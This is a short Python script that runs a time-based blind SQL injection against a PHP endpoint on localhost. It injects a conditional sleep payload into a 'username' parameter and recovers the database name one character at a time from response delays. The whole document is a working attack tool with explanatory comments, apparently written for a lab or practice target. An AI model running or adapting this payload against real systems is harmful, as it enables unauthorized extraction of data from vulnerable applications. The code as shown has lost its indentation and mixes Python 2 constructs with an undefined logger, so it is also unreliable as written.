#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
# from pwn import *

# Function to control the program output when Ctrl+C is executed.
def def_handler(sig, frame):
log.failure("Exiting")
sys.exit(1)

# definition of the function to be used when a Ctrl+C signal is produced
signal.signal(signal.SIGINT, def_handler)

# variable to store the victim URL
url = 'http://127.0.0.1:1234/index.php'

# variable to tunnel BurpSuite queries
burp = {'http': 'http://127.0.0.1:8080'}

# variable to store the characters to be tested
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!ยก\/{}[]'
# variable to store the results
result = ''

# function to check the time it takes for the server to respond
def check(payload):
# variable storing the final url of the request
req = "%s?method=select&username=administrator%s&table=passwords" % (url, payload)

# variable that stores the current time value
time_start = time.time()
# variable that will store the response of the GET request
content = requests.get(req)
# variable that stores the value of the time at the end of the request
time_end = time.time()
# check if the difference between the start time and the end time is greater than 5 seconds
if time_end - time_start > 5:
return 1

print("\n[*] Initiating brute force\n")

# first loop that loops through each of the characters of the name
# with a predefined size of 10
for i in xrange(1, 10):
# nested loop traversing each of the characters stored in the variable s
# in the variable s
for c in s:
# variable that will store the statement to be injected
# in this case we will use a "' and " so that it will be executed when the first instruction fails
# will check if the %d character of the database() database name string matches the %c character and if it matches the
# the %c character and if it matches it will wait 5 seconds. Being %d=i and %c=c
payload = "'+and+if(substr(database(),%d,1)='%c',sleep(5),1)--+-" % (i,c)
# check if the return of the check function is 1, which would mean that it has taken more than 5 seconds.
if check(payload):
# add the character to the result variable
result += c
sys.stdout.write('\r'+'Result: '+str(result))
sys.stdout.flush()
# print(result)
break
print("\n\n[*] Execution completed!")

# print the final result
# log.info("Database: %s" % result)